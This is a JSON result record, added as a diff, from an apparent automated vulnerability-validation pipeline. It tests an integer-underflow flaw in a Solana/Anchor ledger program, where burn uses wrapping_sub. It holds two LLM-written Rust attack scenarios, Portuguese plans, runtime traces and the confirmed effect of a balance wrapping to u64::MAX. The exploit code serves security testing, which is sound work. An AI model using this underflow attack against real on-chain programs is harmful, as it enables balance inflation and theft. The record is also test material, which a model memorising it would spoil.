@@ -1,0 +1,247 @@
+{
+  "category": "MATH",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: user_balance wrapped to u64::MAX (underflow); total_supply wrapped to 999 (underflow)",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2448,
+        "completion_tokens": 626,
+        "latency_s": 3.66
+      },
+      "raw": "{\n  \"plan\": \"Inicializo o ledger com initial_supply=1000 e user_balance=0 via a instrucao initialize (baseline legitimo). Depois chamo burn com amount=1, que e maior que user_balance=0, para acionar o wrapping_sub. O efeito medido e que user_balance deu a volta para u64::MAX (underflow) em vez de a instrucao falhar, e total_supply tambem sofreu wrap-around.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet ledger_key = Pubkey::new_unique();\\n\\nlet init_ix = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(1000u64,),\\n    vec![\\n        AccountMeta::new(ledger_key, true),\\n        AccountMeta::new(authority, true),\\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\\n    ],\\n);\\n\\nlet (system_program_id, system_program_account) = system_program_account();\\n\\nlet init_accounts = vec![\\n    (ledger_key, empty_account()),\\n    (authority, wallet(1_000_000_000)),\\n    (system_program_id, system_program_account),\\n];\\n\\nlet baseline = env.baseline(\\\"initialize ledger with supply 1000\\\", &init_ix, &init_accounts);\\n\\nlet ledger_after_init = after(&baseline, &ledger_key).clone();\\n\\nlet burn_ix = env.anchor_ix(\\n    \\\"burn\\\",\\n    &(1u64,),\\n    vec![\\n        AccountMeta::new(ledger_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\n\\nlet burn_accounts = vec![\\n    (ledger_key, ledger_after_init),\\n    (authority, wallet(1_000_000_000)),\\n];\\n\\nlet r = env.attack(\\\"burn amount=1 with user_balance=0 (underflow)\\\", &burn_ix, &burn_accounts);\\n\\nif r.program_result == ProgramResult::Success {\\n    let data = after(&r, &ledger_key).data();\\n    let user_balance = read_u64(data, 40);\\n    let total_supply = read_u64(data, 8);\\n    env.effect(\\\"user_balance wrapped to u64::MAX (underflow)\\\", user_balance == u64::MAX);\\n    env.effect(\\\"total_supply wrapped to 999 (underflow)\\\", total_supply == 999u64);\\n}\"\n}",
+      "plan": "Inicializo o ledger com initial_supply=1000 e user_balance=0 via a instrucao initialize (baseline legitimo). Depois chamo burn com amount=1, que e maior que user_balance=0, para acionar o wrapping_sub. O efeito medido e que user_balance deu a volta para u64::MAX (underflow) em vez de a instrucao falhar, e total_supply tambem sofreu wrap-around.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet ledger_key = Pubkey::new_unique();\n\nlet init_ix = env.anchor_ix(\n    \"initialize\",\n    &(1000u64,),\n    vec![\n        AccountMeta::new(ledger_key, true),\n        AccountMeta::new(authority, true),\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\n    ],\n);\n\nlet (system_program_id, system_program_account) = system_program_account();\n\nlet init_accounts = vec![\n    (ledger_key, empty_account()),\n    (authority, wallet(1_000_000_000)),\n    (system_program_id, system_program_account),\n];\n\nlet baseline = env.baseline(\"initialize ledger with supply 1000\", &init_ix, &init_accounts);\n\nlet ledger_after_init = after(&baseline, &ledger_key).clone();\n\nlet burn_ix = env.anchor_ix(\n    \"burn\",\n    &(1u64,),\n    vec![\n        AccountMeta::new(ledger_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\n\nlet burn_accounts = vec![\n    (ledger_key, ledger_after_init),\n    (authority, wallet(1_000_000_000)),\n];\n\nlet r = env.attack(\"burn amount=1 with user_balance=0 (underflow)\", &burn_ix, &burn_accounts);\n\nif r.program_result == ProgramResult::Success {\n    let data = after(&r, &ledger_key).data();\n    let user_balance = read_u64(data, 40);\n    let total_supply = read_u64(data, 8);\n    env.effect(\"user_balance wrapped to u64::MAX (underflow)\", user_balance == u64::MAX);\n    env.effect(\"total_supply wrapped to 999 (underflow)\", total_supply == 999u64);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "initialize ledger with supply 1000",
+            "result": "Success",
+            "compute_units": 5819,
+            "account_flags": "sw,sw,-r",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": "2b2915d5b4b05f200000000000000001000000000000000000000000000000000000000000000000e8030000000000000000000000000000"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111111111111111111111111111111",
+                "signer": false,
+                "writable": false,
+                "owner": "NativeLoader1111111111111111111111111111111",
+                "data_len": 14,
+                "head": "73797374656d5f70",
+                "digest": "d8e11c483f20607a",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "burn amount=1 with user_balance=0 (underflow)",
+            "result": "Success",
+            "compute_units": 2338,
+            "account_flags": "-w,sr",
+            "ix_head": "1c11d5fa33c6f4a4",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA",
+                "data_len": 56,
+                "head": "2b2915d5b4b05f20",
+                "digest": "794431038c10784f",
+                "post": "2b2915d5b4b05f200000000000000001000000000000000000000000000000000000000000000000e703000000000000ffffffffffffffff"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "user_balance wrapped to u64::MAX (underflow)",
+            "holds": false
+          },
+          {
+            "step": "effect",
+            "note": "total_supply wrapped to 999 (underflow)",
+            "holds": false
+          }
+        ],
+        "runtime_trace": [
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA invoke [1]",
+          "Program 11111111111111111111111111111111 invoke [2]",
+          "Program 11111111111111111111111111111111 success",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA consumed 5819 of 1400000 compute units",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA success",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA invoke [1]",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA consumed 2338 of 1400000 compute units",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "not_confirmed",
+      "reason": "ataque aceito, mas nenhuma condicao de dano foi verdadeira: user_balance wrapped to u64::MAX (underflow); total_supply wrapped to 999 (underflow)\nEstado das contas gravaveis depois do ataque (hex, ate 256 bytes; confira os offsets):\nconta #0 (1111111o..): 56 bytes = 2b2915d5b4b05f200000000000000001000000000000000000000000000000000000000000000000e703000000000000ffffffffffffffff"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3059,
+        "completion_tokens": 669,
+        "latency_s": 3.49
+      },
+      "raw": "{\"plan\": \"O cenario anterior usou offsets errados: o layout do Ledger e authority (32 bytes) + total_supply (u64 em 32) + user_balance (u64 em 40), mas o discriminador Anchor ocupa os primeiros 8 bytes, entao total_supply esta em 40 e user_balance em 48. O baseline inicializa o ledger com supply 1000 e user_balance 0. O ataque chama burn com amount=1, que faz wrapping_sub em user_balance (0-1 = u64::MAX) e em total_supply (1000-1 = 999). O efeito mede esses valores nos offsets corretos.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet ledger_key = Pubkey::new_unique();\\n\\nlet init_ix = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(1000u64,),\\n    vec![\\n        AccountMeta::new(ledger_key, true),\\n        AccountMeta::new(authority, true),\\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\\n    ],\\n);\\n\\nlet (system_program_id, system_program_account) = system_program_account();\\n\\nlet init_accounts = vec![\\n    (ledger_key, empty_account()),\\n    (authority, wallet(1_000_000_000)),\\n    (system_program_id, system_program_account),\\n];\\n\\nlet baseline = env.baseline(\\\"initialize ledger with supply 1000\\\", &init_ix, &init_accounts);\\n\\nlet ledger_after_init = after(&baseline, &ledger_key).clone();\\n\\nlet burn_ix = env.anchor_ix(\\n    \\\"burn\\\",\\n    &(1u64,),\\n    vec![\\n        AccountMeta::new(ledger_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\n\\nlet burn_accounts = vec![\\n    (ledger_key, ledger_after_init),\\n    (authority, wallet(1_000_000_000)),\\n];\\n\\nlet r = env.attack(\\\"burn amount=1 with user_balance=0 (underflow)\\\", &burn_ix, &burn_accounts);\\n\\nif r.program_result == ProgramResult::Success {\\n    let data = after(&r, &ledger_key).data();\\n    let total_supply = read_u64(data, 40);\\n    let user_balance = read_u64(data, 48);\\n    env.effect(\\\"user_balance wrapped to u64::MAX (underflow)\\\", user_balance == u64::MAX);\\n    env.effect(\\\"total_supply wrapped to 999 (underflow)\\\", total_supply == 999u64);\\n}\"}",
+      "plan": "O cenario anterior usou offsets errados: o layout do Ledger e authority (32 bytes) + total_supply (u64 em 32) + user_balance (u64 em 40), mas o discriminador Anchor ocupa os primeiros 8 bytes, entao total_supply esta em 40 e user_balance em 48. O baseline inicializa o ledger com supply 1000 e user_balance 0. O ataque chama burn com amount=1, que faz wrapping_sub em user_balance (0-1 = u64::MAX) e em total_supply (1000-1 = 999). O efeito mede esses valores nos offsets corretos.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet ledger_key = Pubkey::new_unique();\n\nlet init_ix = env.anchor_ix(\n    \"initialize\",\n    &(1000u64,),\n    vec![\n        AccountMeta::new(ledger_key, true),\n        AccountMeta::new(authority, true),\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\n    ],\n);\n\nlet (system_program_id, system_program_account) = system_program_account();\n\nlet init_accounts = vec![\n    (ledger_key, empty_account()),\n    (authority, wallet(1_000_000_000)),\n    (system_program_id, system_program_account),\n];\n\nlet baseline = env.baseline(\"initialize ledger with supply 1000\", &init_ix, &init_accounts);\n\nlet ledger_after_init = after(&baseline, &ledger_key).clone();\n\nlet burn_ix = env.anchor_ix(\n    \"burn\",\n    &(1u64,),\n    vec![\n        AccountMeta::new(ledger_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\n\nlet burn_accounts = vec![\n    (ledger_key, ledger_after_init),\n    (authority, wallet(1_000_000_000)),\n];\n\nlet r = env.attack(\"burn amount=1 with user_balance=0 (underflow)\", &burn_ix, &burn_accounts);\n\nif r.program_result == ProgramResult::Success {\n    let data = after(&r, &ledger_key).data();\n    let total_supply = read_u64(data, 40);\n    let user_balance = read_u64(data, 48);\n    env.effect(\"user_balance wrapped to u64::MAX (underflow)\", user_balance == u64::MAX);\n    env.effect(\"total_supply wrapped to 999 (underflow)\", total_supply == 999u64);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "initialize ledger with supply 1000",
+            "result": "Success",
+            "compute_units": 5819,
+            "account_flags": "sw,sw,-r",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": "2b2915d5b4b05f200000000000000001000000000000000000000000000000000000000000000000e8030000000000000000000000000000"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111111111111111111111111111111",
+                "signer": false,
+                "writable": false,
+                "owner": "NativeLoader1111111111111111111111111111111",
+                "data_len": 14,
+                "head": "73797374656d5f70",
+                "digest": "d8e11c483f20607a",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "burn amount=1 with user_balance=0 (underflow)",
+            "result": "Success",
+            "compute_units": 2338,
+            "account_flags": "-w,sr",
+            "ix_head": "1c11d5fa33c6f4a4",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA",
+                "data_len": 56,
+                "head": "2b2915d5b4b05f20",
+                "digest": "794431038c10784f",
+                "post": "2b2915d5b4b05f200000000000000001000000000000000000000000000000000000000000000000e703000000000000ffffffffffffffff"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "user_balance wrapped to u64::MAX (underflow)",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "total_supply wrapped to 999 (underflow)",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA invoke [1]",
+          "Program 11111111111111111111111111111111 invoke [2]",
+          "Program 11111111111111111111111111111111 success",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA consumed 5819 of 1400000 compute units",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA success",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA invoke [1]",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA consumed 2338 of 1400000 compute units",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: user_balance wrapped to u64::MAX (underflow); total_supply wrapped to 999 (underflow)"
+    }
+  ],
+  "case_id": "SSP-03-A-V2",
+  "static_finding": {
+    "category": "MATH",
+    "confidence": "high",
+    "evidence": "ledger.user_balance = ledger.user_balance.wrapping_sub(amount);\nledger.total_supply = ledger.total_supply.wrapping_sub(amount);",
+    "explanation": "A instrucao usa wrapping_sub para subtrair o valor de amount dos saldos, o que silenciosamente faz underflow (wrap-around) em vez de falhar. Nao ha verificacao previa de que user_balance >= amount nem uso de checked_sub. O enum ErrorCode define ArithmeticUnderflow, mas ele nunca e usado, indicando que a checagem foi omitida.",
+    "attack_hypothesis": "Um atacante chama burn com amount maior que o user_balance atual (por exemplo, amount = user_balance + 1). O wrapping_sub faz o saldo dar a volta para um valor enorme (u64::MAX), inflando artificialmente o saldo do atacante e corrompendo total_supply, permitindo drenar ou manipular o ledger.",
+    "category_note": ""
+  }
+}
